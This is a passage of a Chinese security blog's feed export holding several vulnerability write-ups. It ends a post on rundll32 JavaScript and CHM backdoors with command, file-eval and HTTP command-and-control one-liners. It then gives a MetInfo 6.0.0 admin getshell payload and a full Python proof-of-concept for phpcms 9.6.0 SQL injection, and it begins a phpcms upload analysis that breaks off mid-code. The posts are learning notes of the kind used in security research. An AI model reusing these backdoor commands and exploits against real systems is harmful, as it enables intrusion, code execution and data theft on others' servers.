捆绑后门.resources/82E82E61-3559-43CF-A336-1E4B923C591D.png" alt="c4f1838a6afa2810a377bde24e717b33"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>JS后门优点：</p><ol><li>无文件落地</li><li>持续控制</li><li>后台rundll32.exe进程稳定</li></ol><p>缺点：<br>不免杀，容易被检测</p><p>CHM后门优点：<br>钓鱼强<br>不会被AV检测，只会在调用危险进程时被检测，本身不含有恶意代码</p><p>配合可以达到nishang中不弹窗的效果</p><h2 id="0x06-JS-backdoor-Tips"><a href="#0x06-JS-backdoor-Tips" class="headerlink" title="0x06 JS backdoor Tips"></a>0x06 JS backdoor Tips</h2><p>//Execute A Command<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></p><p>//Write To A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\Temp\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close;</span><br></pre></td></tr></table></figure></p><p>//Read and Execute From A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\Temp\\testfile.txt&quot;,1);eval((f.ReadAll()));</span><br></pre></td></tr></table></figure></p><p>//Map A Remote Share (WEBDAV)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;https://live.sysinternals.com&quot;);self.close;</span><br></pre></td></tr></table></figure></p><p>//Map A Local Share<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;\\\\Localhost\\c$&quot;);self.close;</span><br></pre></td></tr></table></figure></p><p>//Read and Execute Commands From A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\Temp\\Commands.txt&quot;,1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject(&quot;WScript.Shell&quot;);t.Run(&quot;cmd%20/c%20&quot;%20+%20f.ReadLine(),null,true);&#125;;</span><br></pre></td></tr></table></figure></p><p>//Retrieve Commands From HTTP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1/a.txt&quot;,false);h.Send();B=h.ResponseText;alert(B);</span><br></pre></td></tr></table></figure></p><p>//POST results back to Server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;POST&quot;,&quot;http://127.0.0.1:8081/a.php&quot;,false);h.Send(&quot;Stuff&quot;);</span><br></pre></td></tr></table></figure></p><h2 id="0x07-Links"><a href="#0x07-Links" class="headerlink" title="0x07 Links"></a>0x07 Links</h2><p><a href="https://evi1cg.me/archives/chm_backdoor.html" target="_blank" rel="noopener">https://evi1cg.me/archives/chm_backdoor.html</a><br><a href="http://drops.wooyun.org/tips/8568" target="_blank" rel="noopener">http://drops.wooyun.org/tips/8568</a><br><a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a><br><a href="http://drops.wooyun.org/tips/11764" target="_blank" rel="noopener">http://drops.wooyun.org/tips/11764</a><br><a href="http://drops.wooyun.org/tips/12386" target="_blank" rel="noopener">http://drops.wooyun.org/tips/12386</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学了一波evi1cg博客上的捆绑后门，做个记录&lt;/p&gt;
&lt;h2 id=&quot;0x01-思路&quot;&gt;&lt;a href=&quot;#0x01-思路&quot; class=&quot;headerlink&quot; title=&quot;0x01 思路&quot;&gt;&lt;/a&gt;0x01 思路&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;思路：&lt;br
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Metinfo 6.0.0 任意代码写入导致getshell</title>
    <link href="http://patrilic.top/2019/04/03/Metinfo%206.0.0%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5/"/>
    <id>http://patrilic.top/2019/04/03/Metinfo 6.0.0 任意代码写入/</id>
    <published>2019-04-03T02:58:32.000Z</published>
    <updated>2019-04-03T03:01:44.495Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>漏洞关键点<br>位于/Applications/MxSrvs/www/MetInfo6.0.0/admin/include/global.func.php中约878行的Copyindx函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">$oldcont =<span class="string">"&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">$fp = fopen($newindx,w);</span><br><span class="line">fputs($fp, $oldcont);</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>$type可控，并且直接带入到php代码中，前提是不存在 $newindx 变量，往上跟函数</p><p>位于/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/global.func.php的124行调用该函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyindx(ROOTPATH.$foldername.<span class="string">'/index.php'</span>,$module);</span><br></pre></td></tr></table></figure></p><p>规定 $newindx 为目录名 + /index.php, 然后 $module 该文件  </p><p>再往上跟，找到/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/save.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($if_in==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>($filename!=<span class="string">''</span> &amp;&amp; $filename!=$filenameold)&#123;</span><br><span class="line">$filenameok = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE filename='&#123;$filename&#125;' and foldername='$foldername' and id!='$id'"</span>);</span><br><span class="line"><span class="keyword">if</span>($filenameok)metsave(<span class="string">'-1'</span>,$lang_modFilenameok);</span><br><span class="line"><span class="keyword">if</span>(is_numeric($filename) &amp;&amp; $filename!=$id &amp;&amp; $met_pseudo)&#123;</span><br><span class="line">$filenameok1 = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE id='&#123;$filename&#125;' and foldername='$foldername'"</span>);</span><br><span class="line"><span class="keyword">if</span>($filenameok1)metsave(<span class="string">'-1'</span>,$lang_jsx30);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$filedir=<span class="string">"../../"</span>.$foldername;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($filedir))@mkdir($filedir,<span class="number">0777</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($filedir))metsave(<span class="string">'-1'</span>,$lang_modFiledir);</span><br><span class="line">column_copyconfig($foldername,$module,$id);</span><br></pre></td></tr></table></figure><p>满足该条件即可调用colnmn_copyconfig()函数</p><p><strong>攻击流程</strong> </p><ol><li>登陆后台</li><li>构造payload：admin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;phpinfo();/*</li><li>访问/upload/index.php</li></ol><p>注意：</p><ol><li>foldername可控，如果upload目录下存在index.php，不会重复写入，更换目录即可</li><li>/* 必须要求，会注释掉后面的require_once ‘../include/module.php’; 防止跳转到404页面</li></ol><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p><img src="/Metinfo 6.0.0 任意代码写入.resources/848F9960-F75C-46E1-9661-C20F9BA586A0.png" alt="3e67b9c86d5847910d672ea170c376e5"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞分析&quot;&gt;&lt;a href=&quot;#0x01-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞分析&quot;&gt;&lt;/a&gt;0x01 漏洞分析&lt;/h2&gt;&lt;p&gt;漏洞关键点&lt;br&gt;位于/Applications/MxSrvs/www/MetInf
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>phpcms_v9.6.0 wap模块 SQL注入</title>
    <link href="http://patrilic.top/2019/04/03/phpcms_v9.6.0%20wap%E6%A8%A1%E5%9D%97%20sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://patrilic.top/2019/04/03/phpcms_v9.6.0 wap模块 sql注入/</id>
    <published>2019-04-03T02:58:32.000Z</published>
    <updated>2019-04-03T02:59:50.468Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>漏洞发生在 /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/content/down.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">unset</span>($i,$m,$f);</span><br><span class="line">parse_str($a_k);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">$allow_visitor = <span class="number">1</span>;</span><br><span class="line">$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</span><br><span class="line">$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br></pre></td></tr></table></figure><p>$_GET 方法传入 $a_k ， 经过sys_auth 解密之后，进入 parse_str,解析到变量中<br>最后带入到</p><blockquote><p>\$rs = \$this-&gt;db-&gt;get_one(array(‘id’=&gt;$id)); 进行查询</p></blockquote><p>所以现在如果能找到一个经过sys_auth 并能回显给我payload的地方即可</p><p>/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/attachment/attachments.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</span><br><span class="line">$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</span><br><span class="line">$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</span><br><span class="line">$json_str = json_encode($arr);</span><br><span class="line">$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</span><br><span class="line">$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</span><br><span class="line"><span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先经过safe_replace 函数，过滤一遍，然后存入数组，如果不满足条件进入 set_cookie函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</span><br><span class="line">$_COOKIE[$var] = $value;</span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，对传入的value 进行一次sys_auth 然后setcookie，可以在返回包中拿到回显</p><p>最后还需要存在一个cookie，让我们不被跳转到main界面<br>/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/wap/index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</span><br><span class="line">param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);</span><br></pre></td></tr></table></figure></p><p>通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。</p><p><strong>攻击链：</strong></p><ol><li>访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。</li><li>将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】</li><li>获取返回头的set—Cookie字段，此即为加密后的payload</li><li>访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。</li></ol><h2 id="0x02-Poc"><a href="#0x02-Poc" class="headerlink" title="0x02 Poc"></a>0x02 Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018-12-20 23:24</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step1 = url + <span class="string">"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1"</span></span><br><span class="line">        response = requests.get(step1)</span><br><span class="line">        post = &#123;</span><br><span class="line">            <span class="string">"userid_flash"</span>:response.cookies[<span class="string">"okuga_siteid"</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        print(<span class="string">"[+] Get Cookie : "</span> + response.cookies[<span class="string">"okuga_siteid"</span>])</span><br><span class="line">        <span class="comment"># 获取cookie，避免登陆失效</span></span><br><span class="line"></span><br><span class="line">        step2 = url + <span class="string">"//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"</span></span><br><span class="line">        response = requests.post(step2, post)</span><br><span class="line">        <span class="comment"># print(response.cookies)</span></span><br><span class="line">        sqli_payload = response.cookies[<span class="string">'okuga_att_json'</span>]</span><br><span class="line">        print(<span class="string">"[+] Get Sqli_poc : "</span> + sqli_payload)</span><br><span class="line">        <span class="comment"># 获取加密 payload</span></span><br><span class="line"></span><br><span class="line">        step3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</span><br><span class="line">        response = requests.get(step3)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        user = re.findall(<span class="string">r'&lt;/b&gt;XPATH syntax error:(.*?)&lt;br /&gt;'</span>, response.text)</span><br><span class="line">        <span class="comment"># 注入</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"[+] Congraduations! This url is Vulnerable! "</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"[-] Not vulnerable!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">     url = sys.argv[<span class="number">1</span>]</span><br><span class="line">     poc(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞分析&quot;&gt;&lt;a href=&quot;#0x01-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞分析&quot;&gt;&lt;/a&gt;0x01 漏洞分析&lt;/h2&gt;&lt;p&gt;漏洞发生在 /Applications/MxSrvs/www/phpcms_V9.6
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>phpcms_v9.6.0 任意文件上传</title>
    <link href="http://patrilic.top/2019/04/02/phpcms_v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://patrilic.top/2019/04/02/phpcms_v9.6.0 任意文件上传/</id>
    <published>2019-04-02T11:56:09.127Z</published>
    <updated>2019-04-03T02:51:26.596Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>漏洞 url：</p><blockquote><p><a href="http://localhost/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1" target="_blank" rel="noopener">http://localhost/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</a></p></blockquote><p>跟进 /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/member/index.php</p><p>漏洞代码从129行-136行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line"><span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>$_POST[‘info’] 被函数 new_html_special_chars 过滤一遍<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_html_special_chars</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$encoding = <span class="string">'utf-8'</span>;</span><br><span class="line"><span class="keyword">if</span>(strtolower(CHARSET)==<span class="string">'gbk'</span>) $encoding = <span class="string">'ISO-8859-15'</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> htmlspecialchars($string,ENT_QUOTES,$encoding);</span><br><span class="line"><span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>htmlspecialchars($string, ENT_QUOTES, $encoding)<br>实体化编码 单引号和双引号<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>();</span><br><span class="line">$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line"><span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">$field = safe_replace($field);</span><br><span class="line">$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span 